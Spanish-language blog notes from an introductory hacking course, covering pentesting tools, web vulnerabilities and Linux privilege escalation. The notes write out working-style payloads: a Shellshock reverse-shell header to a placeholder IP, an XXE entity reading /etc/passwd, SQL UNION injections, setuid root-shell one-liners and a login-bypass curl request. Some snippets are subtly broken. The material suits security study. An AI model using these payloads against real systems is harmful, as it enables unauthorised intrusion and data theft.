---
layout: single
title: Apuntes del curso Introducción al hacking
excerpt: "En este post están los apuntes que considero importante, también algunos recordatorios"
date: 2021-10-11
classes: wide
header:
  teaser: #/assets/images/
  teaser_home_page: true
categories:
  - Research
  - Utilidades
  - Exploits
  - Vulnerabilidades
tags:
  - Pentesting
  - Herramientas
  - Windows
  - Linux
  - Vulnerabilidades
  - Guías
  - Privilege Escalation
---

![](/assets/images/certifados/Introduccion-al-hacking.jpeg)

# Conceptos básicos
## Asignación e Interpretación de permisos

Para interpretar permisos podemos verlos con el comando **ls -l** el cual nos muestra los permisos que tienen las carpetas o 
archivos y tendremos lo siguiente:

```

d rwx r-xr-x *****   *****   0 B Fri Nov 19 13:43:46 2021  *****


d: directorio
   rwx           rwx       rwx
Propietario     Grupo     Otros
    P             G         O



   rwx           r-x
   ***         solo se puede leer
                y se puede atravesar


r: leer
w: escribir
x:
  f: ejecutable
  d: se puede atravesar como un (cd "directorio")


``` 

También podemos conocerlo de manera numerica de la siguiente forma:
 
**r = 2^2 = 4** 

**w = 2^1 = 2**

**x = 2^0 = 1**

así como también podemos cambiar esos permisos con __chmod__ ya sea de las siguientes maneras:


*chmod g+w "directorio"* | *chmod o-w "directorio"*
*chmod 774 "directorio"* | *chmod 751 "directorio"*

<div>
<p style = 'text-align:center;'>
<img src="https://mural.uv.es/oshuso/p1.jpg" width="500px">
</p>
</div>

***Permisos STICKY BIT***

Cuando se le asigna a un directorio, significa que los elementos que hay en ese directorio solo 
pueden ser renombrados o borrados por su propietario o bien por root. El resto de usuarios que 
tengan permisos de lectura y escritura, los podrán leer y modificar, pero no borrar.

*chmod 1775 "directorio"*

***Permisos SUID o SGID***

Cuando se activa el bit SUID sobre un fichero significa que el 
que lo ejecute va a tener los mismos permisos que el que creó el archivo.

*chmod 4775 "directorio"*

Con toda esta información podemos abusar y explotar privilegios 


## Explotación de tareas Cron

Las tareas Cron son las que se ejecutan en intervalos regulares de tiempo *en segundo plano*, su estructura es la
siguiente:

<div>
<p style = 'text-align:center;'>
<img src="https://www.redeszone.net/app/uploads-redeszone.net/2017/01/Linux-cron-crontab-a%C3%B1adir-tareas-periodicas.png" width="500px">
</p>
</div>

Con esto podemos ver si alguna tarea se está ejecutando en segundo plano y podemos conseguir dominio root con conocimientos básicos
También podemos crear un script en bash para automatizar la tarea y buscar qué se está ejecutando en segundo plano
por ejemplo este código básico:

{% highlight shell %}
#!/bin/bash

old_process= $(ps -eo command)

while true; do
     new_process= $(ps -eo command)
     diff <(echo "$old_process") <(echo "$new_process") 
     | grep "[\>\<]" | grep -v "/"
     old_process= $new_process
done

{% endhighlight %}

Después de ejecutarlo vemos que permisos tienen las carpetas o archivos, si encontramos un permiso SUID podemos conseguir el "root"
como lo vimos antes.

## Explotación de un PATH Hijacking

Consiste en suplantar una librería **$PATH**, que un binario esté usando para inyectar código de forma que 
el atacante escale privilegios y/u obtenga un shell en el sistema o consiga root.
Para aplicar esto de manera sencilla primero vemos el contenido de la variable **$PATH** con el comando **echo $PATH**
y nos da como respuesta una ruta, podemos crear un archivo .sh para poder introducirlo como ataques por inyección

Debemos intuir si un proceso se está ejecutando de forma absoluta o relativa, teniendo en cuenta que esta última 
es de riesgo ya que podemos alterar el flujo de comandos.

El procedimiento para la explotación:

1.-Ubicar el programa

2.-Listar los permisos de la ubicación en la que se encuentra

3.-Leer el contenido del programa

4.-Crear un archivo para suplantar una de las librerías del programa

5.-Inyectar el código deseado 

Podemos usar esta web para ayudarnos [GTFOBins](https://gtfobins.github.io/)
 
## Herramienta NMAP

Existe la herramienta Nmap que se usa para enumerar puertos, tenemos algunos parametros como:

**-v**   :Significa «verbose», por lo que se nos indica lo que está haciendo el análisis al detalle-->

**-n**  :Quita la resolución DNS

**-p-** :Quiere decir que se escaneará todos los puertos 

**-sS** :Este comando determina si el puerto objetivo está escuchando

**-sV** :Para detectar las versiones de los servicios

**-sC** :Sirve para realizar un analisis de secuencia de comandos. Es equivalente a –script = default

**-Pn** :Si un usuario no cuenta con privilegios elevados sobre paquetes, este es el comando para escanear con la opción «conexión TCP»

**-O**  :Detecta el sistema operativo

**-A**  :Escaneo de Sistema Operativo y servicios


## Escaneo de servicios de banner ligero

Es mucho menos ruidoso que un escaneo agresivo y permite obtener datos sin llamar demasiado la atención, 
lo que aporta una clara ventaja.


{% highlight shell %}
nmap -sV --version-intensity 0 {IP}
{% endhighlight %}

también podemos usar los scripts por defecto que vienen con nmap, para buscar vulnerabilidades, etc.
Lo usamos ejecutando este código:


{% highlight shell %}
nmap -sV -p{ports} {IP} --scripts ""
{% endhighlight %}


para saber los nombres de los scripts los podemos filtrar 


{% highlight shell %}

function scripts_nmap(){
        locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
}

{% endhighlight %}

 - *Haciendo Fuzzing para encontrar directorios*

Podremos hacer fuzzing con los scripts de nmap, pero tener en cuenta que el script solo te enlista algunos directorios 
por eso su peso es menor y no hace tanta bulla como las listas encontradas en el siguiente directorio: 

`/usr/share/wordlists/dirbuster/`

Usamos este comando para para el fuzzing con nmap

{% highlight shell %}
nmap -p80 {IP}  --script http-enum -oN webScan
{% endhighlight %}

Si eres curioso puedes ver como se intercepta el trafico que se envía a las páginas para encontrar esos directorios con Tshark 
o Wireshark; pero también existen otras herramientas para encontrar directorios como:

 - *Wfuzz*

{% highlight shell %}
wfuzz -c -L -t 400 --hc=400 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  {IP}/FUZZ
{% endhighlight %}


**-c** 

Es para que lo muestre en colores(es opcional)

**-L**

Es un follow redirect

**--hc= 404**

Es para que oculte aquellos directorios que muestran error 404 NOT FOUND

**-t 400**

Para intentar con 400 directorios de la lista, se puede manipular


Para agregar extensiones a los directorios nos creamos un .txt con los siguientes nombres dentro "php, html, txt" y lo
agregamos a nuestro comando Wfuzz de la siguiente manera.

{% highlight shell %}
wfuzz -c -L -t 400 --hc=400 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -w extensiones.txt {IP}/FUZZ/FUZ2Z
{% endhighlight %}

 - *Dirbuster*

Esta manera es gráfica asi que no creo que haya problemas y que no sea necesario explicar

 - *Dirb*

{% highlight shell %}
dirb {IP}
{% endhighlight %}

 - *GoBuster*

{% highlight shell %}
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --url {IP}
{% endhighlight %}

 - *DirSearch*

Este se debe descargar desde su git 

{% highlight shell %}
./dirsearch.py -u {ip} -E -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
{% endhighlight %}

## Técnicas de enumeración bajo un servidor web

 - *wafw00f*

Esta herramienta ayuda a buscar si la página web utiliza un WAF(Web Application Firewall)

{% highlight shell %}
wafw00f {IP}
{% endhighlight %}

## Uso de BurpSuite

Es una app que sirve de intermediario entre la página y la peticiones que se envía, podemos leer cómo se usa en este link 

[BurpSuite](https://www.manusoft.es/tutorial-burp-suite/)

Usando las herramientas del mismo BurpSuite tenemos el "repeater" que nos permite tener la respuesta de la 
página en la misma app 

[Repeater](https://portswigger.net/burp/documentation/desktop/tools/proxy/getting-started)

Otra de las herramientas interesantes de BurpSuite es "intruder" que nos permite automatizar ataques añadiendo payloads 
a los comandos que introducimos a la pagg

[Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using)

# Tipos de Vulnerabilidades 

## Local File Intrusion (LFI)

Esta técnica consiste en incluir ficheros locales, es decir, archivos que se encuentran en el mismo servidor de la web con este tipo
de fallo -a diferencia de Remote File Inclusión o inclusión de archivos remotos (RFI) que incluye archivos alojados en otros 
servidores. Esto se produce como consecuencia de un fallo en la programación de la página, filtrando inadecuadamente lo que se 
incluye al usar funciones en PHP para incluir archivos.

[LFI](https://www.welivesecurity.com/la-es/2015/01/12/como-funciona-vulnerabilidad-local-file-inclusion/)

## Log Poisoning - LFI to RCE

Cuando uno encuentra una vulnerabilida LFI lo mejor sería convertirla a RCE(Remote Code Execution) 
Entonces, hay una variedad de trucos diferentes para convertir su LFI en RCE, como por ejemplo:


1.- Using file upload forms/functions

2.- Using the PHP wrapper expect://command

3.- Using the PHP wrapper php://file

4.- Using the PHP wrapper php://filter

5.- Using PHP input:// stream

6.- Using data://text/plain;base64,command

7.- Using /proc/self/environ

8.- Using /proc/self/fd

9.- Using log files with controllable input like:

        /var/log/apache/access.log
        /var/log/apache/error.log
        /var/log/vsftpd.log
        /var/log/sshd.log
        /var/log/mail

## Remote File Inclusion RFI

Esta vulnerabilidad consiste en subir archivos a una página desde la de nuestro servidor compartido por el puerto 80.
Abrimos nuestro servidor de la siguiente manera:

        sudo python3 -m http.server 80

Y luego procedemos a continuar con la vulnerabulidad, la podemos buscar directamente desde searchexploit

## Vulnerabilidad HTML Injection y XSS 

Cross-site scripting (XSS) es un ataque de inyección de código que permite a un atacante ejecutar JavaScript 
malicioso en el navegador de otro usuario, este ataca a otros usuarios que se conectan a dicha página web, 
y los ataca en busca de varias cosas:

secuestrarles la sesión, robarles la contraseña o cualquier otra 
información que considere de interés.

 - *Cross Site Scripting persistente*

Si el código que hemos insertado se queda almacenado en el servidor, por ejemplo formando parte de una contribución en un foro, 
el ataque se dice que es persistente. Cualquier usuario que entre a leer dicha contribución leerá el texto inocente 
pero probablemente no así el código inyectado, que sin embargo sí será interpretado por el navegador del visitante, 
ejecutando las instrucciones que se haya definido.

Estas acciones pueden ser variadas, y dependerá del tipo de navegador, de sus vulnerabilidades inherentes, 
así como también de las de otros programas que tenga instalados, el Adobe Flash Player por ejemplo, que se ejecuten 
como el atacante tiene previsto. Para él es por tanto una ruleta de la suerte. 
No puede predecir el usuario que va a caer en la trampa.

 - *Cross Site Scripting reflejado*

Pero si el código que insertamos no se queda almacenado en la web, sino que va embebido dentro de un enlace que se hace 
llegar de algún modo a la víctima para que pinche en él, se dice que este tipo de ataque es reflejado. 
Se llama así porque, si finalmente la víctima pincha en el enlace, el navegador le llevará a la página en cuestión, 
que normalmente es un sitio legal donde el usuario tiene cuenta abierta, y a continuación ejecutará el código embebido, 
el cual intentará robarle la «cookie» de la sesión, o los datos que introduzca en el formulario, o incluso podrá desencadenar 
acciones más sofisticadas en su PC. Pero la característica diferencial con el anterior ataque es que en este caso 
en el servidor web no queda almacenado nada.

 - *¿Cómo saber si un sitio web tiene esta vulnerabilidad?*

Si en un sitio que ofrece búsquedas por palabras clave, en lugar de usar ese campo para buscar, escribimos lo siguiente: 

     <script type = ‘text / javascript’> alert (‘soy vulnerable a XSS reflejado’); </ script>  

le damos a buscar y, … voilà, entonces aparece un «pop up» con el mensaje «soy vulnerable a XSS reflejado», ¡bingo!: 
este sitio tiene la vulnerabilidad XSS reflejado.

## Vulnerabilidad Cross-Site Request Forgery (CSRF)

Las tres variantes del CSRF que se perpetúan con mayor frecuencia son las siguientes: 
la más empleada consiste en colar una URL, dicha URL se esconde en una página web externa o en un correo electrónico. 
El acceso a esta URL desencadena la solicitud HTTP y por norma general, el usuario sí puede ver esta URL si presta atención, 
no obstante, el origen de la URL se puede ocultar mediante ingeniería social y la técnica de spoofing.

## Vulnerabilidad Server-Side Request Forgery (SSRF)

Las vulnerabilidades SSRF (Server Side Request Forgery) y los ataques de XSPA (Cross Site Port Attacks) son dos fallos de seguridadque van casi siempre de la mano. Los bugs de SSRF se producen en aplicaciones web inseguras que permiten a un atacante forzar al 
servidor web a realizar peticiones desde dentro del sistema hacia el exterior. Usando esas conexiones, los ataques de XSPA tratan 
de conocer, en base a las respuestas obtenidas, la lista de puertos que se encuentran abiertos o por el contrario cerrados en el 
servidor al que se fuerza la conexión.

## SQL Injection

 - *SQLmap*

Esta herramienta automatiza las inyecciones SQL y para su uso podemos leerlo por aquí

[SQLmap](https://www.solvetic.com/tutoriales/article/1615-sqlmap-herramienta-de-inyecci%C3%B3n-de-sql-y-ethical-hacking-de-bases-de-datos/#:~:text=Esta%20herramienta%20sirve%20para%20testear,de%20una%20base%20de%20datos.)

 - *Manera manual*

Para entender como funciona la vulnerabilidad debemos intentarlo por nuestra cuenta, primero nos creamos una base de datos
para jugar

```bash
service mysql start
mysql -uroot
create table Tabla1(id int(2), username varchar(32), password(32));
insert into Tabla1(id, username, password) values (1, "username", "password");
select * from Tabla1;
select * from Tabla1 where id = 1; #Selecciona los datos con la id que pongas
select * from Tabla1 where id = 1 order by 100;-- -; #Hace un ordenamiento de datos en base a la columna 100
select * from Tabla1 where id = 1 union select 1,2,3,4;-- -; #Donde los numeros 1,2,3,4 pueden ser reemplazados por código
select * from Tabla1 where id = 1 union select @@version, database(), user(), load_file('/etc/passwd');
```
En el código anterior vemos distintos parametros

**@@version** : Muestra la versión de la base de datos

**database()** : Muestra la base de datos que se está usando

**user()** : Nombra el usuario que usa la base de datos

**load_file('')** : Carga un archivo que se coloque en las comillas

Para listar la base de datos de manera alternativa podemos usar el siguiente código:

```bash
select * from Tabla1 where id= 1 union select 1,schema_name,3,4 from information_schema.schemata
```

Para listar las tablas de una base de dato de manera alternativa usamos el siguiente código:

```bash
select * from Tabla1 where id= 1 union select 1,table_name,3,4 from information_schema.tables where table_schema = 'Table1';-- -;
```

Para listar las columnas el siguiente código:

```bash
select * from Tabla1 where id=1 union select 1, column_name,3,4 from information_schema.columns where table_schema='Table1' and table_name='Nombre_de_la_tabla' 
```

Para poder listar los datos que ya sabemos que la base de datos tiene podemos usar el siguiente código:

```bash
select * from Tabla1 where id=1 union select 1, concat(username,0x3a,password),3,4 from Tabla1.'Nombre_de_la_tabla'
```

## Vulnerabilidad Padding Oracle Attack - Padbuster

Esta vulnerabilidad no solo se aplica en las páginas web si no en cualquiera que utilice un algoritmo de cifrado de bloques de longitud variable (es decir que necesita usar relleno o padding) y son vulnerables.

[Explotar padding oracle para obtener claves de cifrado](https://www.hackplayers.com/2018/10/explotar-padding-oracle-para-obtener-clave.html)
 
 - Padding Oracle Attack - BurpSuite Bit Flipper Attack

Para este tipo de ataques utilizamos el burpsuit, mandamos el código fuente al intruder después cargamos un payload a la cookie y marcamos un ataque de tipo Bit Flipper y lo dejamos correr.
Con esta función automatiza el ataque y te envía la cookie correcta que buscas.

## Vulnerabilidad ShellShock

Este tipo de ataque funciona cuando las cabeceras terminan en .cgi, .pl, .sh e incluso pueden ser otras extensiones, algunos vectores vulnerables son:

 - Servidor Web CGI
 - Servidor OpenSSH
 - Clientes DHCP
 - Servidor QMail
 - Shell restringida IBM HMC

Para poder hacer un ataque cambiamos el *User Agent* con BurpSuite y abrimos un puerto de escucha con nc, recargamos la página y se recarga la petición.

```bash
User-Agent: () { :; }; /bin/bash -i /dev/tcp/{IP}/443 
```

[ShellShock](https://blog.cloudflare.com/inside-shellshock/)

## Vulnerabilidad XML External Entity Injection (XXE)

XXE se refiere a un ataque de falsificación de solicitud de servidor (SSRF), mediante el cual un atacante es capaz de causar:

 - Denegación de servicio (DDoS)
 - Acceso a archivos y servicios locales o remotos

Una vulnerabilidad de XXE consiste en una inyección que se aprovecha de la mala configuración del intérprete XML permitiendo incluir entidades externas, este ataque se realiza contra una aplicación que interpreta lenguaje XML en sus parámetros.
Para identificar esta vulnerabilidad podemos interceptar la página con BurpSuite, si el Content Types es de tipo text/xml, application/xml estos son indicadores que nos permiten verificar, cómo los parámetros son enviados por el request a un intérprete de XML, adicionalmente también existe puede darse al parsear archivos como JSON a XML e inyectar el payload en el sitio web.
Para ver si la web tiene este tipo de vulnerabilidad podemos intentar lo que se presenta en la siguiente página:

[XXE](https://backtrackacademy.com/articulo/explorando-la-vulnerabilidad-xxe-xml-external-entity)

Inyectamos el código en la página, ya sea en el url o si es que se puede subiendo un archivo malicioso con el sgte código para listar usuarios

```bash
<!DOCTYPE foo  [<!ENTITY bar SYSTEM "file:///etc/passwd">]> <foo>&bar;</foo>
```

[Entendiendo y Explotando XXE](https://underc0de.org/foro/bugs-y-exploits/entendiendo-y-explotando-xxe-(external-xml-entities)/)

## Vulnerabilidad Domain Zone Transfer

Las Transferencias de zona dns, a veces llamadas AXFR por el tipo de solicitud, es un tipo de transacción de DNS. Es uno de varios mecanismos disponibles para administradores para replicar bases de datos DNS a través de un conjunto de servidores DNS. La transferencia puede hacerse de dos formas: completa (AXFR) o incremental (IXFR)

[Domain Zone Transfer](https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/)

Tenemos diferentes programas para realizar el ataque, su sintaxis serían las siguientes:

 - dnsenum

```bash
dnsenum --enum {IP}
```

 - dig
 
```bash    
dig @{IP} {URL} axfr     
```

## Vulnerabilidades de tipo Insecure Deserialization

Para comprender qué es la deserialización insegura, primero debemos comprender qué son la serialización y la deserialización.

 - La serialización se refiere a un proceso de conversión de un objeto a un formato que puede conservarse en el disco (por ejemplo,   guardarse en un archivo o almacén de datos), enviarse a través de secuencias (por ejemplo, stdout) o enviarse a través de una re   d. El formato en el que se serializa un objeto puede ser binario o texto estructurado (por ejemplo, XML, JSON YAML…). JSON y XML   son dos de los formatos de serialización más utilizados dentro de las aplicaciones web.

 - La deserialización, por otro lado, es lo opuesto a la serialización, es decir, transformar datos serializados provenientes de un   archivo, flujo o conector de red en un objeto.

[Más información](https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/)

## Vulnerabilidad Type Juggling sobre panel Login

Este tipo de vulnerabilidad se da en archivos .php que usan tablas comparativas para logearse, se pede romper con este comando:
```bash
curl -s -X POST --data "usuario=&password[]=" {IP/}
```

# Escala de privilegios

## Abuso del Sudoers para escalar privilegios

Para escalar privilegios debemos listar los permisos, investigando en [GTFobins](https://gtfobins.github.io/) encontramos la manera de acceder como root

## Abuso de permisos SUID para escalar privilegios

Listamos si tenemos privilegios SUID con el comando `find \perm -4000 2>/dev/null` y buscamos en la anterior página si hay una vulnerabilidad. 
[SUID](https://www.luisguillen.com/posts/2017/12/como-funcionan-permisos-suid/)

## Abuso de las Capabilities para escalar privilegios

[Capabilities](https://www.incibe-cert.es/blog/linux-capabilities)

En la anterior página tenemos información sobre la escala de privilegio a traves de las Capabilities, algunos comandos son:

```bash
getcap -r / 2>/dev/null #Reconocimiento de capas
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
php7.3 -r "posix_setuid(0); system('/bin/bash');"
```
## PATH Hijacking / Library Hijacking

Para escalar privilegios debemos buscar algunas librerias de python que tienen esta vulnerabilidad, como se muestra en la siguiente página
[Python Hijacking](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

## Abuso del Kernel para escalar privilegios

Para esta escala de privilegios debemos saber la version de kernel de la máquina y buscar una vulnerabilidad ya sea en searchexploit entre otros.

```bash
uname -a
```

# Reconocimiento del sistema

Es recomendable hacer un reconocimiento de nuestro sistema, la siguiente herramienta nos ayuda a reconocer el sistema Linux, en cuanto a Windows tenemos winPEAS.

[Windows](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

[Linux](https://github.com/diego-treitos/linux-smart-enumeration)
